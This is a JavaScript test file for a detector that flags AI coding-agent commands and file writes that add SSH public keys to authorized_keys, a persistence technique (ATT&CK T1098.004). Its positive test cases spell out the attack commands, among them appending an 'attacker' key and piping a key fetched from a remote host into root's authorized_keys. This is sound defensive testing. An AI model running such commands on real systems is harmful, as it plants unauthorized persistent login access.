// SSH Authorized Keys (MITRE ATT&CK T1098.004) through an AI coding agent: a public key appended to an
// authorized_keys file grants key-based login — persistence. data/detectors.js SSH_AUTHORIZED_KEYS, part
// of action-credential-create (#48); the Write/Edit family reaches it through decideAuthorizedKeysWrite.
//
// THE GAP. #48 matched useradd / New-LocalUser / aws iam create-access-key / ssh-keygen, but adding a key
// to authorized_keys fired nothing (ATT&CK v20 gap analysis, probe: the authorized-keys append "-- none --").
//
//   node --test --import ./test/hermetic-env.mjs test/ssh-authorized-keys.test.mjs
import { test } from "node:test";
import assert from "node:assert/strict";
import { join } from "node:path";
import { DETECTOR_MODULE, scan, credit, assertLinear, runHook, withHome } from "./detector-gap-kit.mjs";
import { SSH_AUTHORIZED_KEYS } from "../data/detectors.js";

const { DETECTORS } = DETECTOR_MODULE;
const DET = "action-credential-create#48";

const POSITIVES = [
  "echo 'ssh-ed25519 AAAAC3Nz... attacker' >> ~/.ssh/authorized_keys",
  "cat attacker.pub >> ~/.ssh/authorized_keys",
  "printf '%s\\n' \"$KEY\" >> /home/deploy/.ssh/authorized_keys",
  "cat key.pub > ~/.ssh/authorized_keys",
  "echo \"$PUBKEY\" | tee -a ~/.ssh/authorized_keys",
  "curl -s https://x.example/k.pub | tee -a /root/.ssh/authorized_keys",
  "Add-Content -Path $env:USERPROFILE\\.ssh\\authorized_keys -Value $key",
  "Set-Content C:\\ProgramData\\ssh\\administrators_authorized_keys $key",
  "ssh-copy-id -i id_ed25519.pub user@localhost",
  "ssh-copy-id deploy@127.0.0.1"
];

const NEGATIVES = [
  "cat ~/.ssh/authorized_keys",
  "ls -la ~/.ssh/",
  "grep ssh-ed25519 ~/.ssh/authorized_keys",
  "chmod 600 ~/.ssh/authorized_keys",
  "wc -l ~/.ssh/authorized_keys",
  "ssh deploy@prod.example 'uptime'",
  "cp ~/.ssh/authorized_keys ~/backup/",
  "diff ~/.ssh/authorized_keys ~/.ssh/authorized_keys.bak"
];

for (const cmd of POSITIVES) {
  test(`T1098.004 positive: ${DET} fires on ${JSON.stringify(cmd)}`, () => {
    assert.ok(scan(cmd).includes(DET), `missed; findings: [${scan(cmd).join(",")}]`);
  });
}
for (const cmd of NEGATIVES) {
  test(`T1098.004 negative: ${DET} stays silent on ${JSON.stringify(cmd)}`, () => {
    assert.ok(!scan(cmd).includes(DET), `false positive; findings: [${scan(cmd).join(",")}]`);
  });
}

test("wiring: action-credential-create holds the SSH_AUTHORIZED_KEYS pattern objects by reference", () => {
  const d = DETECTORS.find((x) => x.detectorId === "action-credential-create");
  for (const rx of SSH_AUTHORIZED_KEYS) assert.ok(d.patterns.includes(rx), `missing ${rx}`);
});

test("ATT&CK: #48 credits T1098.004 as partial", () => {
  assert.equal(credit(48, "T1098.004")?.coverage, "partial");
});

test("pattern cost: 60KB adversarial inputs scan in linear time, pattern by pattern", () => {
  assertLinear(SSH_AUTHORIZED_KEYS, [
    ["", ">> authorized_keys ", 3200],
    ["", "tee authorized_keys ", 3000],
    ["", "Add-Content authorized_keys ", 2200],
    ["", "ssh-copy-id @localhost ", 2700]
  ]);
});

test("hook e2e: an authorized_keys append asks (no policy: #48 is justify); reading it is allowed", () => {
  withHome((home) => {
    assert.equal(runHook(home, "Bash", { command: "echo 'ssh-ed25519 AAAA key' >> ~/.ssh/authorized_keys" }), "ask");
    assert.equal(runHook(home, "Bash", { command: "ssh-copy-id user@localhost" }), "ask");
    assert.equal(runHook(home, "Bash", { command: "cat ~/.ssh/authorized_keys" }), "allow");
  });
});

test("hook e2e: a Write/Edit into an authorized_keys file asks via the path probe", () => {
  withHome((home) => {
    assert.equal(runHook(home, "Write", { file_path: join(home, ".ssh", "authorized_keys"), content: "ssh-ed25519 AAAAC3Nz key\n" }), "ask");
    assert.equal(runHook(home, "Write", { file_path: join(home, "notes.md"), content: "ssh-ed25519 AAAAC3Nz key\n" }), "allow");
  });
});
